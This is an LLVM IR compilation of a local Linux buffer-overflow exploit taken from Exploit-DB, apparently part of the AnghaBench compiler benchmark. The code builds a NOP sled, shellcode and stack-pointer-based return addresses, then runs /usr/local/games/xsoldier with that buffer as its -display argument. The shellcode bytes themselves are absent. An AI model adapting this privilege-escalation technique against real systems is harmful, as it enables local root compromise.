; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19677.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19677.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@.str = private unnamed_addr constant [34 x i8] c"Jumping to address %x BufSize %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [26 x i8] c"/usr/local/games/xsoldier\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"xsoldier\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"-display\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @LEN, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %6, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %7, align 8
  %15 = call i64 (...) @get_sp()
  store i64 %15, i64* %10, align 8
  %16 = load i32, i32* %4, align 4
  %17 = icmp sle i32 %16, 1
  br i1 %17, label %18, label %19

18:                                               ; preds = %2
  store i32 0, i32* %9, align 4
  br label %24

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @atoi(i8* %22)
  store i32 %23, i32* %9, align 4
  br label %24

24:                                               ; preds = %19, %18
  store i32 0, i32* %8, align 4
  br label %25

25:                                               ; preds = %38, %24
  %26 = load i32, i32* %8, align 4
  %27 = load i32, i32* @LEN, align 4
  %28 = load i32, i32* @shellcode, align 4
  %29 = call i32 @strlen(i32 %28)
  %30 = sub nsw i32 %27, %29
  %31 = sub nsw i32 %30, 100
  %32 = icmp slt i32 %26, %31
  br i1 %32, label %33, label %41

33:                                               ; preds = %25
  %34 = load i8, i8* @NOP, align 1
  %35 = load i32, i32* %8, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %14, i64 %36
  store i8 %34, i8* %37, align 1
  br label %38

38:                                               ; preds = %33
  %39 = load i32, i32* %8, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %8, align 4
  br label %25

41:                                               ; preds = %25
  %42 = load i32, i32* %8, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %14, i64 %43
  %45 = load i32, i32* @shellcode, align 4
  %46 = load i32, i32* @shellcode, align 4
  %47 = call i32 @strlen(i32 %46)
  %48 = call i32 @memcpy(i8* %44, i32 %45, i32 %47)
  %49 = load i32, i32* %8, align 4
  %50 = load i32, i32* @shellcode, align 4
  %51 = call i32 @strlen(i32 %50)
  %52 = add nsw i32 %49, %51
  store i32 %52, i32* %8, align 4
  br label %53

53:                                               ; preds = %66, %41
  %54 = load i32, i32* %8, align 4
  %55 = load i32, i32* @LEN, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %69

57:                                               ; preds = %53
  %58 = load i64, i64* %10, align 8
  %59 = load i32, i32* %9, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %14, i64 %63
  %65 = bitcast i8* %64 to i64*
  store i64 %61, i64* %65, align 1
  br label %66

66:                                               ; preds = %57
  %67 = load i32, i32* %8, align 4
  %68 = add nsw i32 %67, 4
  store i32 %68, i32* %8, align 4
  br label %53

69:                                               ; preds = %53
  %70 = load i64, i64* %10, align 8
  %71 = load i32, i32* %9, align 4
  %72 = sext i32 %71 to i64
  %73 = add nsw i64 %70, %72
  %74 = load i32, i32* @LEN, align 4
  %75 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i64 %73, i32 %74)
  %76 = call i32 @execl(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %14, i32 0)
  %77 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %77)
  %78 = load i32, i32* %3, align 4
  ret i32 %78
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @get_sp(...) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @printf(i8*, i64, i32) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
